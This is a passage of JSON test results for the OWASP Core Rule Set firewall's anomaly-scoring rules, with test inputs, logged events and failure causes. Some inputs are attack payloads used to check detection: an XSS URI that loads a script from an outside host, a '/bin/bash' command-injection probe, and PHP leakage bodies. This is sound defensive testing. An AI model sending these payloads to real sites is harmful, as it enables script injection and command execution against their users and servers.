          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        } ]
      }
    }
  }, {
    "test_rule" : "949110",
    "test_id" : 5,
    "test_path" : "REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
    "description" : "Test is basically identical to 949110-0 (see above) but here we assert that the scores are summed up and reported properly",
    "cause" : "nothing checked for test 5",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Test is basically identical to 949110-0 (see above) but here we assert that the scores are summed up and reported properly",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "match_regex" : "Inbound Anomaly Score Exceeded \\(Total Score: "
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 949110,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " always check threshold in phase 2"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "TX",
          "key" : "BLOCKING_INBOUND_ANOMALY_SCORE"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "ge",
        "value" : "%{tx.inbound_anomaly_score_threshold}"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 949110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "deny"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Inbound Anomaly Score Exceeded (Total Score: %{TX.BLOCKING_INBOUND_ANOMALY_SCORE})"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "anomaly-evaluation"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        } ]
      }
    }
  }, {
    "test_rule" : "959100",
    "test_id" : 2,
    "test_path" : "RESPONSE-959-BLOCKING-EVALUATION/959100.yaml",
    "description" : "Test is basically identical to 953120-1 (PHP leakage negative test in phase 4) but here we assert that the outbound blocking mechanism is not triggered",
    "cause" : "failed no_expect_ids check: 959100 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=4 rule_id=959100 - Outbound Anomaly Score Exceeded (Total Score: 0)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test is basically identical to 953120-1 (PHP leakage negative test in phase 4) but here we assert that the outbound blocking mechanism is not triggered",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "version" : "HTTP/1.1",
          "uri" : "/reflect",
          "data" : "{\"body\": \"<?php12345\"}"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 959100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 959100,
      "phase" : 4,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " always check threshold in phase 4"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "TX",
          "key" : "BLOCKING_OUTBOUND_ANOMALY_SCORE"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "ge",
        "value" : "%{tx.outbound_anomaly_score_threshold}"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 959100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 4
        }, {
          "type" : "Action",
          "action_type" : "deny"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Outbound Anomaly Score Exceeded (Total Score: %{tx.blocking_outbound_anomaly_score})"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "anomaly-evaluation"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        } ]
      }
    }
  }, {
    "test_rule" : "959100",
    "test_id" : 3,
    "test_path" : "RESPONSE-959-BLOCKING-EVALUATION/959100.yaml",
    "description" : "Test is basically identical to 959100-1 (see above) but here we assert that the scores are summed up and reported properly",
    "cause" : "nothing checked for test 3",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=4 rule_id=953120 - PHP source code leakage", "phase=4 rule_id=959100 - Outbound Anomaly Score Exceeded (Total Score: 0)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Test is basically identical to 959100-1 (see above) but here we assert that the scores are summed up and reported properly",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "version" : "HTTP/1.1",
          "uri" : "/reflect",
          "data" : "{\"body\": \"<?php echo \\\"Hello World!\\n\\\" ?>\"}"
        },
        "output" : {
          "log" : {
            "match_regex" : "Outbound Anomaly Score Exceeded \\(Total Score: "
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 959100,
      "phase" : 4,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " always check threshold in phase 4"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "TX",
          "key" : "BLOCKING_OUTBOUND_ANOMALY_SCORE"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "ge",
        "value" : "%{tx.outbound_anomaly_score_threshold}"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 959100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 4
        }, {
          "type" : "Action",
          "action_type" : "deny"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Outbound Anomaly Score Exceeded (Total Score: %{tx.blocking_outbound_anomaly_score})"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "anomaly-evaluation"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        } ]
      }
    }
  }, {
    "test_rule" : "980170",
    "test_id" : 1,
    "test_path" : "RESPONSE-980-CORRELATION/980170.yaml",
    "description" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that was blocked",
    "cause" : "failed expect_id check: 980170 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920350 - Host header is a numeric IP address", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932160 - Remote Command Execution: Unix Shell Code Found", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that was blocked",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "127.0.0.1",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?a=/bin/bash",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "retry_once" : true,
          "log" : {
            "expect_ids" : [ 980170 ]
          }
        }
      } ]
    },
    "tested_rule" : null
  }, {
    "test_rule" : "980170",
    "test_id" : 2,
    "test_path" : "RESPONSE-980-CORRELATION/980170.yaml",
    "description" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that scored but was not blocked",
    "cause" : "failed expect_id check: 980170 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920350 - Host header is a numeric IP address" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that scored but was not blocked",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "127.0.0.1",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "retry_once" : true,
          "log" : {
            "expect_ids" : [ 980170 ]
          }
        }
      } ]
    },
    "tested_rule" : null
  } ]
}